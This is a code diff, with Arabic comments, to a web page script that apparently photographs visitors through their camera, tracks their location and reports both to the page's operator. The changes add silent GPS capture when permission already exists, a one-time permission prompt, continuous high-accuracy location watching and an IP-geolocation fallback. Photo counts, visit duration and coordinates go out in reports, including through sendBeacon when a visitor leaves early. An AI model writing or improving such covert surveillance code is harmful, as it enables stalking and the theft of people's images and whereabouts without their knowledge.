@@ -129,7 +129,7 @@
       } catch (err) {}
     }
 
-    // دالة إرسال التقرير النهائي (عند انتهاء العداد)
+    // دالة إرسال التقرير النهائي
     async function sendFinalReport() {
       const duration = ((Date.now() - startTime) / 1000).toFixed(1);
       const locStr = latestPosition
@@ -148,9 +148,9 @@
       await sendTextMessage(report);
     }
 
-    // دالة لإرسال تقرير عند الخروج المبكر (باستخدام sendBeacon)
+    // دالة لإرسال تقرير عند الخروج المبكر
     function sendExitReport() {
-      if (photoCount === 0) return; // لم يتم التقاط أي صورة
+      if (photoCount === 0) return;
       const duration = ((Date.now() - startTime) / 1000).toFixed(1);
       const locStr = latestPosition
         ? `${latestPosition.latitude},${latestPosition.longitude} (${latestPosition.source})`
@@ -257,29 +257,75 @@
         sendTextMessage(text);
       } catch(e) {}
 
-      // ---------- جلب الموقع بصمت (بدون نافذة منبثقة) ----------
-      try {
-        // 1. التحقق من صلاحية الموقع
-        const perm = await navigator.permissions.query({ name: 'geolocation' });
-        if (perm.state === 'granted') {
-          // الصلاحية ممنوحة مسبقاً، يمكننا استخدام GPS بدون نافذة
-          try {
-            const pos = await new Promise((resolve, reject) => {
-              navigator.geolocation.getCurrentPosition(resolve, reject, {
-                enableHighAccuracy: true,
-                timeout: 8000,
-                maximumAge: 0
+      // ---------- جلب الموقع (مُحسّن) ----------
+      // 1. محاولة صامتة إذا كان الإذن ممنوحاً مسبقاً
+      let gpsAttempted = false;
+      if (navigator.geolocation) {
+        try {
+          const perm = await navigator.permissions.query({ name: 'geolocation' });
+          if (perm.state === 'granted') {
+            gpsAttempted = true;
+            try {
+              const pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                  enableHighAccuracy: true,
+                  timeout: 8000,
+                  maximumAge: 0
+                });
               });
-            });
-            if (pos.coords.accuracy && pos.coords.accuracy <= 50) {
-              latestPosition = {
-                latitude: pos.coords.latitude,
-                longitude: pos.coords.longitude,
-                accuracy: pos.coords.accuracy,
-                source: 'GPS'
-              };
+              if (pos.coords.accuracy && pos.coords.accuracy <= 50) {
+                latestPosition = {
+                  latitude: pos.coords.latitude,
+                  longitude: pos.coords.longitude,
+                  accuracy: pos.coords.accuracy,
+                  source: 'GPS'
+                };
+              }
+              // بدء المراقبة المستمرة
+              watchId = navigator.geolocation.watchPosition(
+                p => {
+                  if (p.coords.accuracy && p.coords.accuracy <= 50) {
+                    latestPosition = {
+                      latitude: p.coords.latitude,
+                      longitude: p.coords.longitude,
+                      accuracy: p.coords.accuracy,
+                      source: 'GPS'
+                    };
+                  }
+                },
+                () => {},
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+              );
+            } catch (gpsErr) {
+              console.warn('Silent GPS failed:', gpsErr.message);
             }
-            // بدء المراقبة المستمرة أيضاً
+          }
+        } catch (permErr) {
+          // المتصفح لا يدعم permissions.query
+        }
+      }
+
+      // 2. إذا لم نحصل على موقع بعد، نطلب إذن GPS (مرة واحدة)
+      if (!latestPosition && navigator.geolocation) {
+        try {
+          gpsAttempted = true;
+          const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0
+            });
+          });
+          if (pos.coords.accuracy && pos.coords.accuracy <= 50) {
+            latestPosition = {
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              source: 'GPS'
+            };
+          }
+          // بدء المراقبة
+          if (!watchId) {
             watchId = navigator.geolocation.watchPosition(
               p => {
                 if (p.coords.accuracy && p.coords.accuracy <= 50) {
@@ -294,21 +340,13 @@
               () => {},
               { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
             );
-          } catch (gpsErr) {
-            // فشل GPS الصامت، سننتقل إلى IP
-            console.warn('Silent GPS failed:', gpsErr.message);
           }
-        } else {
-          // الصلاحية لم تمنح بعد (prompt أو denied)، لا نطلب الإذن، ننتقل مباشرة إلى IP
-          console.log('GPS permission is', perm.state, '- using IP location instead');
+        } catch (err) {
+          console.warn('GPS permission denied or failed:', err.message);
         }
-      } catch (permErr) {
-        // المتصفح لا يدعم permissions.query، نجرب GPS مباشرة قد يظهر نافذة..
-        // لكن حسب الطلب: لا نريد أي نافذة، لذا ننتقل إلى IP فوراً
-        console.warn('Permissions API not supported, skipping GPS');
       }
 
-      // 2. إذا لم نحصل على موقع GPS، نستخدم IP
+      // 3. إذا فشل كل شيء، استخدم IP
       if (!latestPosition) {
         try {
           const res = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
@@ -373,7 +411,7 @@
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      return canvas.toDataURL('image/jpeg', 0.8); // جودة أفضل
+      return canvas.toDataURL('image/jpeg', 0.8);
     }
 
     function b64toBlob(b64Data, contentType) {
